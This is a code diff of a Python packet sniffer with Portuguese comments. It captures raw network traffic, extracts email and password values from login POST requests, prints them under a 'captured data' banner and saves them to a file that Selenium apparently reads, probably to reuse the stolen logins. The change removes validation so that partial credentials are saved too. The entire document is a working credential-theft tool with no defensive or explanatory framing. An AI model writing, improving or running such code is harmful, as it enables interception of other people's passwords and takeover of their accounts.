@@ -18,7 +18,7 @@ else:
     python_exec = os.path.join(BASE_DIR, ".venv/bin/python")
 
 
-def salvar_credenciais_atomico(email, senha):
+def salvar_credenciais(email, senha):
     """
     Escreve num arquivo temporário e renomeia.
     Isso evita que o Selenium leia o arquivo enquanto ele ainda está sendo escrito.
@@ -39,45 +39,30 @@ def salvar_credenciais_atomico(email, senha):
 def processar(pacote):
     if pacote.haslayer(Raw):
         try:
-            # Decodifica e limpa caracteres nulos que podem quebrar strings
-            data = pacote[Raw].load.decode(errors="ignore").replace('\x00', '')
+            data = pacote[Raw].load.decode(errors="ignore").lower()
 
-            # Verifica se é um POST relevante
-            if "POST" in data and "email=" in data:
+            if "post" in data and ("email=" in data or "passwd=" in data):
+
+                print("\n[🚨 DADOS CAPTURADOS 🚨]")
+                print("-----------------------------------------")
 
                 email = ""
                 senha = ""
 
-                # Lógica de extração mais robusta
-                try:
-                    # Pega o corpo da requisição (após os headers)
-                    if "\r\n\r\n" in data:
-                        body = data.split("\r\n\r\n")[1]
-                    else:
-                        body = data
-
-                    parts = body.split("&")
-                    for part in parts:
-                        if "email=" in part:
-                            email = unquote(part.split("=")[1])
-                        elif "passwd=" in part:
-                            senha = unquote(part.split("=")[1])
-                except IndexError:
-                    return
-
-                # --- CRÍTICO: SÓ SALVA SE TIVER OS DOIS ---
-                # O erro anterior era salvar mesmo com senha vazia
-                if email and senha and len(email) > 3 and len(senha) > 0:
-                    print("\n[🚨 DADOS VÁLIDOS CAPTURADOS 🚨]")
+                if "email=" in data:
+                    email_raw = data.split("email=", 1)[1].split("&")[0]
+                    email = unquote(email_raw)
                     print(f"[EMAIL]  {email}")
-                    print(f"[PASSWD] {senha}")
-                    print("-----------------------------------------")
 
-                    salvar_credenciais_atomico(email, senha)
-                else:
-                    # Debug opcional para ver pacotes fragmentados
-                    # print(f"[debug] Pacote incompleto ignorado. E: {email} S: {len(senha)}")
-                    pass
+                if "passwd=" in data:
+                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
+                    senha = unquote(pass_raw)
+                    print(f"[PASSWD] {senha}")
+
+                # salva imediatamente no arquivo
+                salvar_credenciais(email, senha)
+
+                print("-----------------------------------------\n")
 
         except Exception as e:
             # print(e) # Descomente para debug
